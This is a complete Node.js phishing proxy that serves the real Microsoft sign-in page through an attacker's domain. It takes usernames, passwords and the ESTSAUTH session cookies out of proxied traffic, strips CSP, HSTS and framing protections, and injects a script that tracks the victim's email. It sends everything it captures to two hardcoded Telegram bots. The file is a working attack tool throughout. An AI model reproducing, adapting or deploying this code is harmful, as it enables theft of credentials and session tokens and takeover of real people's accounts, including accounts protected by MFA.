const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const axios = require('axios');

const app = express();
const port = process.env.PORT || 8081;

const upstream = "login.microsoftonline.com";
const telegram_bot_token1 = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
const telegram_chat_id1 = "6743632244";
const telegram_bot_token2 = "5609281274:AAHWsvjYauuibR_vs9MPdInpB8LzB1lJXt8";
const telegram_chat_id2 = "1412104349";

const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only", 
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
  "Set-Cookie",
];

const emailMap = new Map();

async function dispatchMessage(message) {
  try {
    // Send to both Telegram bots
    await Promise.all([
      axios.post(`https://api.telegram.org/bot${telegram_bot_token1}/sendMessage`, {
        chat_id: telegram_chat_id1,
        text: message,
        parse_mode: "HTML"
      }),
      axios.post(`https://api.telegram.org/bot${telegram_bot_token2}/sendMessage`, {
        chat_id: telegram_chat_id2,
        text: message,
        parse_mode: "HTML"
      })
    ]);
  } catch (err) {
    console.error("Telegram error:", err.message);
  }
}

// Middleware to parse JSON and URL-encoded data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Handle click notifications
app.post('/__notify_click', async (req, res) => {
  const { email, ip } = req.body;
  emailMap.set(ip || 'unknown', email || 'unknown');
  await dispatchMessage(`👀 <b>User is ready to enter password</b>\n🧑‍💻 <b>Email</b>: ${email}\n🌐 <b>IP</b>: ${ip}`);
  res.status(200).send('ok');
});

// Main proxy middleware - catches ALL requests
app.use('/', createProxyMiddleware({
  target: `https://${upstream}`,
  changeOrigin: true,
  secure: true,
  followRedirects: true,
  
  onProxyReq: (proxyReq, req, res) => {
    const ip = req.headers['cf-connecting-ip'] || 
                req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
                req.headers['x-client-ip'] ||
                req.headers['true-client-ip'] || 
                req.headers['x-real-ip'] ||
                req.connection.remoteAddress ||
                'unknown';
    
    proxyReq.setHeader('Host', upstream);
    proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
    proxyReq.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
    proxyReq.setHeader('Accept-Language', 'en-US,en;q=0.5');
    proxyReq.setHeader('Accept-Encoding', 'gzip, deflate');
    proxyReq.setHeader('Referer', `${req.protocol}://${req.get('host')}`);
    proxyReq.setHeader('Connection', 'keep-alive');
    proxyReq.setHeader('Upgrade-Insecure-Requests', '1');
    
    console.log(`🔄 Proxying ${req.method}: ${req.protocol}://${req.get('host')}${req.originalUrl} → https://${upstream}${req.originalUrl}`);
    
    // Capture credentials from POST data
    if (req.method === 'POST' && req.body) {
      let loginfmt = '';
      let passwd = '';
      
      if (typeof req.body === 'string') {
        const params = new URLSearchParams(req.body);
        loginfmt = params.get('loginfmt') || '';
        passwd = params.get('passwd') || '';
      } else if (typeof req.body === 'object') {
        loginfmt = req.body.loginfmt || '';
        passwd = req.body.passwd || '';
      }
      
      if (loginfmt) {
        emailMap.set(ip, loginfmt);
      }
      
      if (loginfmt && passwd) {
        dispatchMessage(`📥 <b>Captured Credentials</b>:\n🧑‍💻 <b>Email</b>: ${loginfmt}\n🔑 <b>Password</b>: ${passwd}`);
      }
    }
  },
  
  onProxyRes: (proxyRes, req, res) => {
    const ip = req.headers['cf-connecting-ip'] || 
                req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
                req.headers['x-client-ip'] ||
                req.headers['true-client-ip'] || 
                req.headers['x-real-ip'] ||
                req.connection.remoteAddress ||
                'unknown';
    
    // Remove security headers that block framing/proxying
    delete_headers.forEach(header => {
      delete proxyRes.headers[header];
    });
    
    // Set CORS headers
    proxyRes.headers['access-control-allow-origin'] = '*';
    proxyRes.headers['access-control-allow-credentials'] = 'true';
    
    // Capture cookies
    const setCookieHeaders = proxyRes.headers['set-cookie'];
    if (setCookieHeaders) {
      const importantCookies = setCookieHeaders.filter(cookie =>
        /(ESTSAUTH|ESTSAUTHPERSISTENT|SignInStateCookie)=/.test(cookie)
      );
      
      if (importantCookies.length === 3) {
        const victimEmail = emailMap.get(ip) || 'unknown';
        const cookieText = importantCookies.map(c => c.split(';')[0]).join('\n');
        dispatchMessage(`🍪 <b>Captured Cookies</b> for <b>${victimEmail}</b>:\n<code>${cookieText}</code>`);
      }
      
      // Modify cookies to use our domain
      proxyRes.headers['set-cookie'] = setCookieHeaders.map(cookie =>
        cookie.replace(new RegExp(upstream, 'g'), req.get('host'))
      );
    }
    
    // Inject JavaScript for credential capture on HTML responses
    if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
      delete proxyRes.headers['content-length'];
      delete proxyRes.headers['content-encoding'];
      
      let body = '';
      proxyRes.on('data', chunk => {
        body += chunk;
      });
      
      proxyRes.on('end', () => {
        // Replace Microsoft domain with our domain
        body = body.replace(new RegExp(`https://${upstream}`, 'g'), `${req.protocol}://${req.get('host')}`);
        body = body.replace(new RegExp(upstream, 'g'), req.get('host'));
        
        // Inject credential capture script
        const script = `
        <script>
          document.addEventListener('DOMContentLoaded', () => {
            const interval = setInterval(() => {
              const btn = document.getElementById("idSIButton9");
              const emailInput = document.querySelector("input[name='loginfmt']");
              if (btn && emailInput) {
                clearInterval(interval);
                const realIP = "${ip}";
                btn.addEventListener("click", () => {
                  fetch("/__notify_click", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      event: "next_button_clicked",
                      email: emailInput.value,
                      ip: realIP
                    }),
                  });
                });
              }
            }, 500);
          });
        </script>`;
        
        body = body.replace('</body>', script + '</body>');
        
        res.end(body);
      });
    }
  },
  
  onError: (err, req, res) => {
    console.error('Proxy error:', err.message);
    res.status(500).send('Proxy error');
  }
}));

app.listen(port, '0.0.0.0', () => {
  console.log(`🚀 Microsoft Login Proxy running on port ${port}`);
  console.log(`🌐 Proxying: https://${upstream} → http://localhost:${port}`);
  console.log(`🎯 This will show the REAL Microsoft login page:`);
  console.log(`   - Microsoft logo`);
  console.log(`   - "Sign in" heading`);
  console.log(`   - "Email, phone, or Skype" input`);
  console.log(`   - "No account? Create one!" link`);
  console.log(`   - "Can't access your account?" link`);
  console.log(`   - Full Microsoft branding and functionality`);
});